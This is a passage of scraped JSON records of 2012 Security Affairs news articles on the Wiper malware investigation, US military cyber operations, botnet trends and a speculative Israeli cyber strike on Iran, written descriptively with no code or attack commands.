{"topic_link": "https://securityaffairs.co/wordpress/tag/wiper", "topic_name": "Wiper"}]}, {"news_name": "Wiper, assumptions and difficulties analyzing a malware", "news_link": "https://securityaffairs.co/wordpress/8319/malware/wiper-assumptions-and-difficulties-analyzing-a-malware.html", "title": "Wiper, assumptions and difficulties analyzing a malware\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 31, 2012", "body": "During last April many press agencies and security firms published a story related to the detection of a new malware, named Wiper that attacked computers at businesses throughout Iran.\n\nKaspersky Lab and the International Telecommunications Union (ITU) investigated on the event trying to isolate the malware and analyze it. During the investigation the team of experts didn\u2019t find any agent with characteristics of Wiper but they discovered the malware related to the Flame campaign, including the Gauss module.\n\nKaspersky team is convinced that Wiper agent wasn\u2019t related to Flame, the cyber espionage platform state sponsored, but Flame is a complex platform able to adapt its behavior simply loading new payload, for example an attractive hypothesis is that Wiper is the last act of a spy action and it is a module loaded trough the Flame platform.\n\nThe investigation of the excellent team of Kaspersky have taken a turn when they obtained several hard drive images attacked by Wiper and have analyzed them.\n\nThe investigation was very hard because the authors of Wiper have covered every trace related to the attacks, after the activation of Wiper the malware destroy any trace of its presence \u2026 at least this was the intention of the designers, but some elements useful to the investigation remained and was the basis for the analysis of experts.\n\n\u201cFrom some of the destroyed systems we were lucky enough to recover a copy of the registry hive. The registry hive did not contain any malicious drivers or startup entries. However, we came up with the idea to look into the hive slack space for deleted entries. \u201c\n\nJust before the pc went down, a specific registry key was created and then deleted. The key was a service named \u201cRAHDAUD64\u201d that pointed to a file on disk named \u201c~DF78.tmp\u201d located in the \u201cC:\\WINDOWS\\TEMP\u201d folder. The name of the file appears random and always it start with the \u201c~\u201d symbol, circumstance that evoke Duqu malware in the mind of experts.\n\n\n\nThe file was impossible to recover due the erasing operated by malware, the experts have also discovered that the wiping process implemented follows a specific pattern which was used to trash the files on disk.\n\n\u201cMost of the files that were wiped contain this specific pattern that repeats over and over. Interestingly, it did not overwrite the entire file. In some cases some portions of the file remained intact, every header of the files were destroyed in the first place. This was probably caused by the size of the file. The wiping algorithm was designed to quickly destroy as many files as possible.\u201d\n\nAgain Tilded Platform\n\nThe researchers noticed that \u201can abnormally large number of machines\u201d contained the same file name: ~DEB93D.tmp, name that is similar to the ones used by the malware produced with the \u201cTilded platform\u201d such as Duqu and Stuxnet.  Of course the file is encrypted, but it is easy to note that file start with with bytes \u201c6F C8\u201d, the same in the Duqu PNF main body.\n\n\n\nResuming,  the investigation has demonstrated the existence of a malware named Wiper that hit Iranian systems until late April 2012, what is impressive is the capacity of the malware to erase every single trace of its existence making hard every kind of analysis.\n\nWe are facing with another malware that in my opinion is son of a state sponsored project and that has been undetected for a long time eluding antivirus system demonstrating the great skills of its authors.\n\nWiper was not related to Flame, it appears more close to Duqu and Stuxnet, given the common filenames, but its an hypothesis.\n\nThe expert of Kaspersky conclude their analysis saying:\n\n\u201cWhat is certain is that Wiper was extremely effective and has sparked potential copycats such as Shamoon. The fact that the use of Wiper led to the discovery of the 4- or 5-year-old Flame cyber-espionage campaign raises a major question. If the same people who created Duqu/Stuxnet/Flame also created Wiper, was it worth blowing the cover of a complex cyber-espionage campaign such as Flame just to destroy a few computer systems?\u201d\n\nThe question proposed is interesting, my personal opinion is that different groups related to allied states have collaborated sharing information on the techniques to develop these kind of agents, this is happened in a fist phase, subsequently the deploy of the malware is evolved in separated way and in case like this creating an interferences that has made possible the discovery of Flame campaign.\n\nFor sure, similar agents are still operative and new ones are under designing \u2026 what is worrying is that these agents are increasing in complexity and are able to elude ordinary defense systems, let\u2019s be prepared to a scary scenario.\n\nPierluigi Paganini\n\n \n\nReferences\n\nhttp://www.securelist.com/en/blog/208193808/What_was_that_Wiper_thing\n\nhttp://blog.eset.com/2012/08/02/flamer-analysis-framework-reconstruction\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gauss", "topic_name": "Gauss"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/shamoon", "topic_name": "Shamoon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tilded-platform", "topic_name": "Tilded Platform"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/wiper", "topic_name": "Wiper"}]}, {"news_name": "U.S. admit cyber attacks.Who will decide in future conflict,humans or machines?", "news_link": "https://securityaffairs.co/wordpress/8222/security/us-cyber-attacks-who-decide-conflict-humans-or-machines.html", "title": "U.S. admit cyber attacks.Who will decide in future conflict,humans or machines?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 28, 2012", "body": "The U.S. are one of the most advanced country under cyber warfare perspective, we have read a lot on its capabilities and its offensive power, to remark some sample we can remind the plan-X project and the development of the cyber weapon Stuxnet. We all imagine that the U.S. are still really active in the cyber space, working on cyber espionage front and also conducting powerful offensives. We know that the country, as many others is facing with a global economic crisis that has impacted also on military sector, the budgets have been sensibly reduced but the high alert level on possibility of a cyber attack make fundamental investments in cyber warfare.\n\nNews of these days is that the U.S. military has been launching cyber attacks against its opponents in Afghanistan according the declaration of the senior officer Marine Lt. Gen. Richard P. Mills. The official has explained during a conference in Baltimore that the U.S. consider highly strategic oversight of the cyber space, giving great importance to the study and implementation of new cyber weapons, that is the new way to fight and it fundamental to be prepared to a cyber warfare scenario. Mills declare:\n\n\u201cI can tell you that as a commander in Afghanistan in the year 2010, I was able to use my cyber operations against my adversary with great impact,\u201d\n\n\u201cI was able to get inside his nets, infect his command-and-control, and in fact defend myself against his almost constant incursions to get inside my wire, to affect my operations.\u201d\n\nThe statements are exhaustive, the US  forces are carrying out cyber attacks on their opponents in Afghanistan, the cyber weapons are critical elements of U.S. cyber arsenal.\n\nIt\u2019s the first time that a high official admits these type of offensive operations in Afghanistan despite it is imaginable the involvement of cyber units.\n\nThe Pentagon spokesman Lt. Col. Damien Pickart refused to give more information on on Mills\u2019s statements for reasons of security.\n\n\u201cwe do not provide specific information regarding our intentions, plans, capabilities or operations.\u201d\n\nThe response is lecit and acceptable, but then why the officer made these revelations publicly?\n\nMany experts are convinced that the U.S. are opening up about the fact that its military operations are active also in cyberspace and have the same efficiency of conventional attacks, the main advantage is that these kind of attacks are really difficult to anticipate and could be conducted silently for years.\n\nDifferently of a conventional attack a cyber attacks has no boudaries, it could be moved in the cyber space to offend any kind of targets and the statements confirm that this what ordinary happen.\n\nThe cyber expert Herbert Lin declared :\n\n\u201cThe U.S. military is starting to talk more and more in terms of what it\u2019s doing and how it\u2019s doing it,\u201d\n\n\u201cA couple of years ago it was hard to get them to acknowledge that they were doing offense at all \u2014 even as a matter of policy, let alone in specific theaters or specific operations.\u201d\n\nThe reply of Pentagon is that US cyber operations were properly authorized and that they took place within the bounds of international law and the \u201cconfines of existing policy.\u201d\n\nWe must consider that today there is an ongoing debate on the usage of cyber weapons and the recourse to cyber attacks as military option, let\u2019s consider also that international regulation are still inadequate in the matter, that\u2019s why the cyber operations  represents the optimum choice.\n\nToday there isn\u2019t a legal and official definition for cyber weapon under the law perspective and every government is hardly working to develop its own arsenal eluding any kind of penalties conducing cyber operations.\n\nU.S. have demonstrated to have a sophisticated program to increase cyber capabilities and to design and spread cyber weapons, let\u2019s consider also that the recent months have been characterized by the discoveries of several agents more or less aggressive such as Stuxnet and Flame utilized to cyber attacks or cyber espionage, anyway for a military operation.\n\nMills\u2019s words are just the last act of an openness on U.S. cyber operations, military action that have been started long ago, there are evidences of the famous project \u201cOlympic Games\u201d started under Bush\u2019s Government and continued under Obama administration. The Pentagon is sustaining project of development of new cyber technology to employ during the cyber attacks, the funding experiment called \u201cPlan X,\u201d demonstrates it.\n\n\u201cThe objective of the Plan X program is to create revolutionary technologies for understanding, planning, and managing cyber warfare in real-time, large-scale, and dynamic network environments,\u201d\n\nThe hard work is assigned to its agency Defense Advanced Research Projects Agency  (DARPA) that have to design new tools for launching attacks against enemies in the cyberspace, these tool include malware and other instruments for cyber espionage.\n\nOfficially the DARPA mission is to develop technology to support the infrastructure for offensive strategies, one of the main targets is to design tool to analyze data flow in every network to provide essential information to military strategists.\n\nAnother ambitious project is the development of an architecture to monitors damage in \u201cdynamic, contested, and hostile network environments\u201d that is equipped with adaptive capacities to mitigate the incoming attacks, these type of systems represents the future, the essential components to deploy in cyber space in case of a conflict.\n\nI desire to conclude with a thought \u2026 every government is working to develop new tool for defensive and offensive purposes, many of these agents are able to work without human control \u2026\n\nAre we confident that these tools are able to make their job safely? What would happen if we lost control of these systems? Could \u201cthe machine\u201d that must defend ourselves become our main enemy?\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/darpa", "topic_name": "DARPA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/plan-x", "topic_name": "Plan X"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/u-s", "topic_name": "U.S."}]}, {"news_name": "Botnet around us, are we nodes of the Matrix?", "news_link": "https://securityaffairs.co/wordpress/8130/cyber-crime/botnet-around-us-are-we-nodes-of-the-matrix.html", "title": "Botnet around us, are we nodes of the Matrix?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 17, 2012", "body": "The nightmare of millions of infected computers synchronized to conduct an attack on specific target finds materialization in the concept of botnet.\n\nIn the classic architecture each machine, named bot, executes orders sent by a master unit called bootmaster, which can instruct the various components of the malicious network to perform an attack rather than exchange communication messages. The model of botnet could be used for various scopes, in military as cyber weapon, in industry for cyber espionage, in cybercrime to steal sensible information such as banking credentials.\n\nAs we will analyze in the article other factors are helping the development of this kind of cyber threat, the evolution of mobile scenario and also the diffusion of agents specialized for social network platforms. The phenomenon of the botnet is worrying due its rapid growth and due the evolution of the model and the continuous improvement we are assisting.\n\nBut let\u2019s start from the beginning, the infection phase that represents the recruiting of the machines due the diffusion of different types of malware developed with specific and profoundly different characteristics. The most common way to build a botnet is to send the victims infected mails, containing link to compromised web site or that have attacked the malware agent that once executed on the machine it transforms it in a bot.\n\nUsually the infected machines try to contact the C&C (Command & Control) server to receive operative instructions. Botnets are created for various purposes such as denial-of-service attacks, creation of SMTP mail relays for targeted spam campaign, implementation of various fraud schemas (e.g. banking information gathering).\n\nBotnets represent one of the most dangerous cyber threats due their adaptive capabilities and the massive diffusion, recent events have demonstrated that every platform could be attacked. One of the most aggressive malware is Flashback Trojan, a malware created to conduct click fraud scam by hijacking people\u2019s search engine results inside their web browsers, stealing banking or login credential. Of course one infected the system it could be used as part of a botnet causing bigger damages. The botnet related to the Flashback Trojan is called Flashfake also designed by cyber criminals to conduct a click fraud scam, taking advantage of pay-per-click campaigns by advertising companies. Flashback was created in September 2011 to disguise itself as an Adobe Flash Player installer, using Flash player layout. Once installed the malware searches for user names and passwords stored on the victims.\n\nWhich is the status of botnet diffusion?\n\nAccording the data proposed in the by McAfee Labs in its McAfee Threats Report \u2013 First Quarter 2012 the cyber threat botnet is growing creating great concern between security experts due their diffusion, millions of compromised computers connected to the Internet are in fact daily used to realize scam and cyber attacks. Observing the volume of messages exchanged between bots and command server is possible to have an indicator on the level of the threat and its diffusion. Overall messaging botnet growth jumped up sharply from last quarter, mainly in Colombia, Japan, Poland, Spain, and the United States.\n\n\n\nMany of the leading messaging botnets (Bobax, Cutwail, Grum, Lethic and Maazben) showed a minor growth or a decline with the exception of Cutwail botnet which increased significantly.\n\nBehind the principal botnets there is the cybercrime industry that is pushing on the diffusion of malware to infect an increasing number of machines,but also proposing new models of business, such as botnet rental or the commerce of the agents for botnet creation. The business is reaching important figures in a short time mainly due to the opportunities provided by the Deep Web.\n\nConsiderable is discovery made by a group of experts of the AlienVault, led by Alberto Ortega, on a new service that offers cyber-attack tools and hosting as part of malware-as-a-service.\n\nOnce again cybercrime operates as enterprise, the products proposed are tools for the organization of cyber attacks such as spam of malware, malware hosting, and a to build up a complete command and control infrastructure (C&C) for the arrangement of botnets.\n\nThe service is called Capfire4 and it\u2019s a good example of C2C (Cybercrime to Cybercrime), it provides technological support to criminals who haven\u2019t necessary knowledge to conduct a cyber attack or to arrange a cyber scam.\n\n\n\nIn the simplest way, users can access to a Web portal that offers the possibility to create customized version of malware, to access to a management console to control bot of the infected networks.\n\nFew steps for criminal that need to create a botnet without having particular knowledge. \n\nThe most popular malware on the portal are RAT (Remote administration tool), software created by to let the attacker spy on the victims with actions like keylogging, password stealing, command execution and remote access and controlling and screen capturing.\n\nThese tools are continually updated and improved to meet customer\u2019s requirements, an excellent work made by specialists. The platform also offer hosting service for the malware, once logged in the client can choose destination of the agent from a list of fake domains that appears like legitimate ones.\n\nCriminal models such as the one introduced make affordable production of malware, also contribute to the diversification of the agents making complex their detection due to subsequent processing and improving. These groups are led by professionals that are familiar with the mechanisms of antivirus detection of the manufacturers of security products. The spread of malware in this way could be used by terrorists or other groups wishing to conduct cyber attacks providing new and powerful weapons at low cost and without any special risks associated with their acquirement and detention.\n\nBotnets and cyber warfare\n\nThe creation of botnets is also considered in cyber warfare scenario as a military option for offensive purposes or cyber espionage.\n\nThrough the establishment of a botnet is possible to attack the nerve centers of a country, isolated attacks can target its critical infrastructures, create serious problems in areas like finance, communications and transport. That is cyber warfare, no matter if behind the attack there is a foreign government or ruthless criminals, the risk is high and face the threat has high priority.\n\nThe US government is taking in serious consideration the cyber threat related to the botnet, recently administrative officials belonging to U.S. President Barack Obama\u2019s team declared that the government had started IBG (Industry Botnet Group) a coordinated project that involves private enterprises and trade units.\n\nOne of the key features of the program is the increasing of the level of awareness on the botnet world through the cooperation of government and private sector.\n\nWhite House Cybersecurity Coordinator Howard Schmidt has deep knowledge of the problem for this reason he\u2019s convening federal agencies, law enforcers and private companies to define a common strategy to deal with the threat.\n\nThe components of the botnets could be located everywhere in the world involving several countries, different social contexts and different laws and regulations, for this reason is quite difficult to arrange a unique front to face with the threat.\n\nDuring the McAfee Public Sector summit in Arlington, Va,  on April 11th, Schmidt declared:\n\n\u201cThere\u2019s been a lot of discussion about botnets\u2026trying to identify how many are out there, what they\u2019re doing, what they could do and what the impact could be. I\u2019ve asked my office to engage in a private-public partnership to enhance the nation\u2019s cyber security by fighting against bot networks,\u201d\n\n\u201cWe\u2019re teaming U.S. internet service providers, search engines, internet vendors, privacy rights advocates and groups and trade associations to tackle this on all fronts. We\u2019re working on developing best practices and an industry code of conduct within the next 90 days.\u201d\n\nThe group of work led by Schmidt is spending a sensible effort in the battle, working to reach the following four main goals:\n\nFundamental aspect is a deep analysis of the current situation and the definition of methods to measure of extent of spread of the threat elaborating a set of indicators, globally recognized, that can provide a status on the evolution of the phenomenon. Another key to fighting the proliferation of botnets is able to increase the level of awareness of the threat in each sector while also providing the tools necessary to tackle the problem.\n\nAccording to Schmidt it is necessary to act immediately due the diffused offensive of botnet chat represents a serious threat for both military and private sectors threatening the security of the nations. What most worries the U.S. government is the high rate of spread of malware in the private sector, not easy to contrast the phenomenon. That it has-been estimated one in ten Americans has some kind of malicious software on their devices.\n\n\u201cWe\u2019re looking at what [botnets] might do to a business\u2019s infrastructure, to personally identifiable information \u2013 identity theft, credit card fraud, et cetera \u2013 but it goes beyond that. What we\u2019re beginning to see is about 4 million new botnet infections every month\u2026it\u2019s a moving target,\u201d\n\n \u201cOne of the clear issues we won\u2019t be doing anymore is to just sit back and admire the problem. We\u2019ve done that for too long. We\u2019ve written strategy after strategy\u2026it\u2019s time to move beyond the strategies and actually move into an environment where we\u2019re executing on these strategies,\u201d\n\nBotnet, a model in continuous evolution\n\nMeantime worldwide security expert are searching for a common strategy to decapitate the botnets, the cybercrime industry is providing new efficient solution to avoid any type of detection and mitigation.\n\nThe real innovation in the last months is represented by the creation of botnet based on the P2P (peer to peer) communication protocol that not relies on command and control (C&C) servers for receiving commands. The new variant is based on a new instance of the Zeus, a malware used mainly to steal information, such as bank credentials, from infected pc. At the end of 2011 it has been identified a new Zeus variant that uses P2P communication to transfer commands from compromised hosts in a botnet. Symantec experts have discovered as spread mechanism the distribution of fake antivirus programs.\n\nThe interesting feature is that P2P communication is used as a backup system in case the C&C servers are not reachable, creating an autonomous peer networks in which each node can operate as a slave or as master giving orders to other PC operating and exchanging information acquired illegally by the victims.\n\nThe Symantec experts Andrea Lelli declared:\n\n\u201cEvery peer in the botnet can act as a C&C server, while none of them really are one,\u201d\n\n\u201cBots are now capable of downloading commands, configuration files, and executable from other bots \u2014 every compromised computer is capable of providing data to the other bots,\u201d\n\n \n\nIn similar botnet, each bot works as a Web server thanks to the presence of nGinx, that equips the malware. The communications between the nodes in the network are based on HTTP protocol.  The new type of botnet is really worrisome because it hard to fight due the absence of  point of failure represented in a classic botnet architecture by the C&C servers, distributed peer networks are so very difficult to identify. Tracking systems such as ZeusTracker are not able to track this variant due the impossibility to add the complete list of components of a P2P network instead only the IP addresses of C&C servers.\n\nTo avoid tracking and dump of traffic the communications mainly use UDP protocol, because TCP is easily detectable. The bot does not perform any authentication on the packets exchanged, so anyone can impersonate a bot and successfully communicate with other bots, downloading stuff like configuration data, this feature could be used to exploit the network.\n\nThe handshake phase between bots is possible using a homemade UDP and after successful connection the nodes start to exchange TCP data (e.g. configuration files, list of other peers, etc).\n\nWhat is still a mystery is how the information is received by botmaster, that\u2019s why analysis are still ongoing. It has been hypothesized that specific conditions can trigger the communication with a specific server to transfer for example the stolen information. Preliminary researches suggest that stolen information are still transmitted back to botmasters using classic methods rather than relayed through the P2P network.\n\nThe Zeus case is not isolated, recently Kaspersky Lab, in collaboration with CrowdStrike Intelligence Team, Dell SecureWorks and members of the Honeynet Project, dismantled the second Hlux botnet (aka Kelihos).\n\nThis botnet had scary size, it has been estimated it was three times larger than the first botnet Hlux / Kelihos dismantled in September 2011. After only 5 days from the transaction, Kaspersky Lab had already neutralized more than 109,000 infected hosts. It is estimated that the first botnet Hlux / Kelihos had only 40,000 infected systems.\n\nThe event has demonstrated that it is becoming hard to tackle new generation of botnets, due the usage of the peer-to-peer technology also implemented in Kelihos. The new variant of malware incorporates P2P technology to eliminate the need for a C&C server, avoiding detection and the immunization campaigns to decapitate the malicious networks.\n\nTo provide another example of botnets we can remind the Alureon / TLD4 botnet that can survive indefinitely in absence of its C&C servers making difficult their detection. The new trend in the development of botnet is to provide them the capability to be \u201cindependent\u201d from control servers, surviving and becoming anonymous for long periods, infecting many machines.\n\nThe battle is difficult, the changes observed in botnet scenario are the result of a development model of malware that has nothing to envy to the development of products of legal industry.\n\nThe mobile scenario, business opportunity and related cyber threats\n\nOne of the IT sector that is interested by the major growth is without doubt the mobile, an increasing number of platforms and related application has been developed in the last mouth consolidating the trend. Of course with growth has been observed a sensible increasing of cyber attacks on the mobile sector, today still vulnerable on the security perspective. To an impressive growth in the demand is not corresponded the awareness of the threat, the user ignores most of the time the potential of its smartphone and threats which it is exposed.\n\nTo remain in topic a mobile botnet is a botnet that targets mobile devices such as smartphones, attempting to gain complete control of the mobile. Mobile botnets take advantage of unpatched exploits to provide hackers with root permissions over the compromised mobile device, enabling hackers to send e-mail or text messages, make phone calls, spy on users, access contacts and photos, and more.\nThe main problem is that botnets go undetected and this make really difficult to tackle.  The malware spread themself sending the agents to other devices via e-mail messages or text messages.\n\nExamples of mobile botnets are DreamDroid and TigerBot (SMS Controlled Android Malware) malware that compromised Google Android devices, Zitmo (zeus varian) that targeted Blackberry platform and CommWarrior which affected Symbian devices. The last in order of time is TigerBot, a new form of Android malware controlled via SMS messages that can record phone calls, upload the device\u2019s GPS location, and reboot the phone, among other operations executable in the command preventing the message from being seen by the user. TigerBot tries to hide itself from the user by not showing any icon on the home screen and by using legitimate sounding app names (like System) or by copying names from trusted vendors like Google or Adobe. \u201dTigerBot\u201d, differs from \u201ctraditional\u201d malware in that it is controlled via SMS rather than from a command & control (C&C) server on the Internet. The polymorphism of the threats and the genesis of new variants are the issues that most concern, these hacks and malware would essentially turn the phones into \u201czombies\u201d in order to respond to external orders.\n\nThe rapid spread of botnet based on mobile devices, it is favored by the almost total absence of protection mechanisms so difficult to tackle and by the difficult to trace the agents composing the network. This cyber threats must alert private industry but especially institutional environment, the risk of data exposure is really high and due the young growth of the sector we are still too vulnerable. Cyber criminals and government agencies are aware of the importance of information gained from our mobile and therefore are showing high interest in the field. In particular it has been observed an exponential growth of malware designed to attack mobile systems and steal sensitive information, useful for the accomplishments of frauds, very impressed the banking sector.\n\n\n\nThe scenario of a mobile attack is always the same, the App stores that is the sites for software download and the mobile apps serve as programs users download onto our mobile devices. Users who download from app stores may download compromised app infected by malware. The number of application available on the store is increasing day by day especially for the open platforms like android. Let\u2019s consider also that there are also third-party stores that provide alternative apps for users, but downloading from these unofficial channels it\u2019s very dangerous for final users. The main problem related alternative app stores are that they are not sufficiently controlled or that can be managed by cyber criminals to provide fake copy of legitimated application modified to realize the fraud. Due the different malware targeting the Android OS several companies have tried to categorize them depending on the fraud and attack schema implemented. Following the categorization proposed by Trend Micro.\n\n\n\nAs previously mentioned, Android Market has less restrictions when it comes to registering as a developer. The strategy is implemented to encourage app developers to adopt the platform, of course this also makes it is easier for cybercriminals to upload their malicious apps or their Trojanized counterparts.  Following some of noteworthy incidents, listed by Trend Micro, that leveraged this loophole:\n\nWe analyzed several Trojanized applications found in the Android Market detected as ANDROIDOS_LOTOOR.A. One of these apps is the game Falling Down, which renders similar to the clean version. Once installed, the Trojanized version asks for more access permissions. It also gathers device information like IMEI and IMSI numbers and roots affected devices.\n\nOne of the malware variants found in the Android Market is the notorious DroidDreamLight variant. Trend Micro researchers found an app that promotes itself as a .APK file management tool. However, instead of helping users, this app (detected as ANDROIDOS_DORDRAE.M) collects device-related information and uploads it to remote servers. It was immediately taken off the Android Market.\n\nGoogle released the Android Market Security Tool in the Android Market. Cybercriminals, on the other hand, were not deterred by this tool and even released a Trojanized version. Detected as ANDROIDOS_BGSERV.A, it acts as a backdoor that gathers information from the device and sends these to a remote URL.\n\nCybercriminals have also created and distributed malware using the names of popular apps that are not yet available on the Android Market. Android users anticipating these games are the likely victims of this ruse. A recent example is a fake version of Temple Run we found in the Android Market. The reports alert mobile users regarding the extension of common threat to mobile environments like advanced persistent threats (APTs). For the implicit nature of the attacks they are considered \u201ccampaigns\u201d rather than singular \u201cincidents,\u201d.\n\nThe introduction of mobile devices has considerably incremented the attack surface making this attacks most frequent. Mobiles are simple to infect through any infected media.\n\nPresent projects for future threats\n\nThe US government is financing several activities to investigate and hack into the technology spread in every device that ordinary surround us. This is the next step of the warfare, spy and attacks foreign enemy simply accessing to the devices that are presents in their offices, in their houses and in their cars.\nEvery device connected to internet could be target of a possible attack, the intelligence which is fitted can be used for numerous purposes, exploiting the lack of awareness in the cyber threat.\n\nThe U.S. government recently promoted a project to hack into video game consoles requesting for the \u201cDevelopment of Tools for Extracting Information from Video Game Systems.\u201d\n\nThe idea is simple as efficient, today consoles are totally equivalent to a computer, they are connected to internet in the same way and they provide many services to the final customer. Last generation of gaming console have pushed on the communication aspect, using the devices the users are able to communicate to every other player connected to the gaming platform, well those communication and any other sensible information stored in the console are object of interest of US intelligence agencies.\n\nThe U.S. Navy has reported that scope of the project is to hack into used consoles to access to any sensitive information exchanged through their messaging services, it has also guarantee that the spying technology will be used only on nations overseas due the internal law restrictions that don\u2019t allow this practices on US citizens.\n\nBut let\u2019s think for a moment to the power of these networks and to the possibility to create a large botnet to attack every type of target. We are facing with an incredible war machine that could destroy and enemy computer system coordinating a cyber attacks of unimaginable dimension or to arrange a large scale infiltration with cyber espionage purpose. Well, this is cyber war and di implementation of botnet using gaming platform is an option examined by the most advanced and technological countries.\n\nRegarding the specific project the official U.S. Navy statement is:\n\n\u201cThis project involves furnishing video game systems, both new and used, and creating prototype rigs for capturing data from the video game systems.\u201d\n\nThe description from the actual contract from the Federal Business Opportunities website, posted on March 26 is:\n\n\u201cR & D effort for the development and delivery of computer forensic tools for analyzing network traffic and stored data created during the use of video game systems.\u201d\n\nThe project has been assigned it to the California-based company Obscure Technologies, signing a contract of $177,237.50 for the job.\n\nWill we see in the future botnet composed by gaming console?\n\nOf course yes \u2026 but don\u2019t\u2019 ask me about consequences!\n\n \n\nConclusions \n\nThe fight against the proliferation of botnets, in my judgment, goes through some key factors such as:\n\nDespite the good intentions we are still far from global agreement of the definition of the proper action against botnet diffusion, both on legislative and operative perspectives.\n\nWe need to hurry!\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Botnet)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/banking", "topic_name": "banking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flashback", "topic_name": "Flashback"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mobile-scenario", "topic_name": "mobile scenario"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-network", "topic_name": "Social Network"}]}, {"news_name": "How Israel will attack Iran?

We all know about the potential of Israeli military, a war machine that could scare the big of the planet and that is characterized by an impressive technological component. Israel has the most advanced cyber army and many experts believe that its intelligence is responsible for the creation of the most advanced cyber weapons. Due these considerations it is expected that in first phase of an offensive against the government of Teheran, Israel will conduct a cyber attack of impressive dimension with the intent to paralyze the country knock out internet, any kind of communications and other critical infrastructure. That is the new way to engage a war, using a cyber strategy to attack the enemy creating the conditions for a military conventional strike that could be advantaged by the chaos created.\n\nOne of the most popular blogger, Richard Silverstain, provides documents that demonstrate the imminent Israeli attack, describing tactics and strategy of the offensive.  The bloggers announced a wide cyber attacks against critical systems of Iran that will cause a global black out that make the country vulnerable to a subsequent military advance. The blogger suggests in a second phase a missile attack to destroy Iran\u2019s defense explaining in detail what could be the sensitive targets, such as nuclear power plant in Arak or the facilities for production of nuclear fuel in Isfahan and the plant at Fordow. The documents also referred to the widespread use of technological tools such as satellite \u201cBlue and White\u201d radar satellite, whose systems enable us to perform an evaluation of the level of damage done to the various targets, will pass over Iran.\n\n\n\nOnly after rapidly decrypting the satellite\u2019s data, will the information be transferred directly to war planes making their way covertly toward Iran. \nThese IAF planes will be armed with electronic warfare gear previously unknown to the wider public, not even revealed to our U.S. ally.  This equipment will render Israeli aircraft invisible. \nThose Israeli war planes which participate in the attack will damage a short-list of targets which require further assault.\n\nAmong the targets approved for attack\u2014Shihab 3 and Sejil ballistic missile silos, storage tanks for chemical components of rocket fuel, industrial facilities for producing missile control systems, centrifuge production plants and hundreds of missiles should be directed against sensitive targets. The documents will also speak of use of new electronic weapons whose existence \u201cis not known even to our U.S. allies.\u201d Another sign that portends an imminent attack is a declaration of Matan Vilnai, a former Israeli Defence Minister, claiming that Israel had \u201cprepared as never before\u201d.\n\n\u201cThere is no room for hysteria,\u201d\n\nsaid the former general, who is stepping down at the end of August to become Israel\u2019s ambassador to China. He echoed an assessment by Defence Minister Ehud Barak, who said that it was believed that some 500 people in Israel might be killed.\n\n\u201cThere might be fewer dead, or more, perhaps\u2026 but this is the scenario for which we are preparing, in accordance with the best expert advice.\u201d \u201cThe assessments are for a war that will last 30 days on several fronts,\u201d\n\nAccording to Vilnai any conflict could cause 500 deaths also does not rule out an attack against chemical and bacteriological Israel against which were placed the necessary security measures. About new technologies \u2026 alarms now also come via sms \u2026 meanwhile, the Army is testing a system to alert SMS to warn people in the event of missile attacks, what would happen if a cyber attack put out of order communications Israeli?\n\nIn a conflict there are too much variables that can influence the scenario, let\u2019s think for example to the Iranian cyber capabilities that could surprise the world, is Israel ready to neutralize them?\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-systems", "topic_name": "critical systems"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}]}, {"news_name": "Gauss, evidence of ongoing cyber-war and cyber espionage campaigns", "news_link": "https://securityaffairs.co/wordpress/8037/intelligence/gauss-evidence-of-ongoing-cyber-war-and-cyber-espionage-campaigns.html", "title": "Gauss, evidence of ongoing cyber-war and cyber espionage campaigns\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 10, 2012", "body": "As expected a 